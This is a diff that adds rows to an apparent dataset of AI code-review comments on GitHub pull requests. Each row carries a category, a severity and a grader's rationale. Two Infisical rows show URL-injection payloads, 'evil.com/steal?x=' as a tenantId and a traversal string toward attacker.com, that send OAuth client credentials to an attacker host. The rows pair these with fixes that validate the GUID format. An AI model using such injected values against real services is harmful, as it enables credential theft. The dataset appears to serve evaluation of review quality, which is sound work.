@@ -4782,3 +4782,33 @@ Same issue when enabling all sources - `setSelectedSources(configuredSources)` d
 How can I resolve this? If you propose a fix, please make it concise.
 `````
 </details>",https://github.com/onyx-dot-app/onyx/pull/7736#discussion_r2723431214,,2026-01-24T02:12:02+00:00,data_integrity,medium,"Greptile correctly identified that `setSelectedSources(previous)` and `setSelectedSources(configuredSources)` in the `handleToggleTool` function don't persist to localStorage, while other similar operations use `enableSources()` or `enableAllSources()` which do persist. This is a real inconsistency that could cause user preferences to be lost on page refresh - a non-obvious bug that requires understanding the difference between the raw setter and the persistence-aware helper functions.",2026-01-24T02:51:50.544954+00:00
+infisical/infisical,5262,feature: add Azure DNS as a provider for ACME,https://github.com/Infisical/infisical/pull/5262,,"**Security Issue: URL Injection in OAuth Token Endpoint**
+
+The `tenantId` is directly interpolated into the Microsoft OAuth URL without validation. A malicious tenant ID could redirect the token request to an attacker-controlled server.
+
+**Attack:** Setting `tenantId` to `evil.com/steal?x=` would create:
+```
+https://login.microsoftonline.com/evil.com/steal?x=/oauth2/v2.0/token
+```
+which resolves to `https://evil.com/steal?x=/oauth2/v2.0/token`, sending the client credentials to the attacker.
+
+**Fix:** Validate `tenantId` format (should be a GUID).
+
+```suggestion
+    // Validate tenantId is a valid GUID
+    if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(tenantId)) {
+      throw new Error('Invalid tenantId format');
+    }
+    
+    const tokenResponse = await request.post<{ access_token: string; expires_in: number }>(
+```",https://github.com/Infisical/infisical/pull/5262#discussion_r2723487133,,2026-01-24T02:49:38+00:00,security,critical,This is a real security vulnerability - the tenantId is directly interpolated into the OAuth URL without validation. A malicious tenantId like 'evil.com/steal?x=' would indeed redirect the token request (containing client_id and client_secret) to an attacker-controlled server. This is a non-obvious SSRF/credential theft vulnerability that most reviewers would miss.,2026-01-24T04:26:43.832471+00:00
+infisical/infisical,5262,feature: add Azure DNS as a provider for ACME,https://github.com/Infisical/infisical/pull/5262,,"**Security Issue: URL Injection via subscriptionId**
+
+The `subscriptionId` is interpolated into the URL without validation. A malicious subscription ID could redirect to an attacker's server.
+
+Validate that `subscriptionId` is a valid GUID before using it in URL construction.",https://github.com/Infisical/infisical/pull/5262#discussion_r2723487178,,2026-01-24T02:49:39+00:00,security,high,"The code directly interpolates `subscriptionId` into URLs at lines 81 and 144 without any validation. Unlike `hostedZoneId` which has GUID format validation via regex, a malicious `subscriptionId` like `../../../attacker.com/malicious` could potentially redirect requests to unintended servers (SSRF). This is a non-obvious security issue that warrants input validation similar to what exists for other Azure resource IDs in this file.",2026-01-24T04:26:43.832596+00:00
+synnaxlabs/synnax,1873,SY-3596: Increase NI sample Rate Limit to 1 MHz,https://github.com/synnaxlabs/synnax/pull/1873,,"Lower bound should be `gt=0` instead of `ge=0` to match TypeScript validation which uses `.positive()` (excludes 0).
+
+```suggestion
+    sample_rate: conint(gt=0, le=1000000)
+```",https://github.com/synnaxlabs/synnax/pull/1873#discussion_r2723502141,,2026-01-24T02:54:56+00:00,logic,medium,"Greptile correctly identifies an inconsistency - using `ge=0` allows a sample_rate of 0, which is semantically invalid for a hardware sampling rate (you can't sample at 0 Hz). The suggestion to use `gt=0` ensures the validation matches the logical requirement that sample rates must be positive, catching a potential edge case that could cause unexpected behavior in downstream NI hardware operations.",2026-01-24T04:26:43.832643+00:00
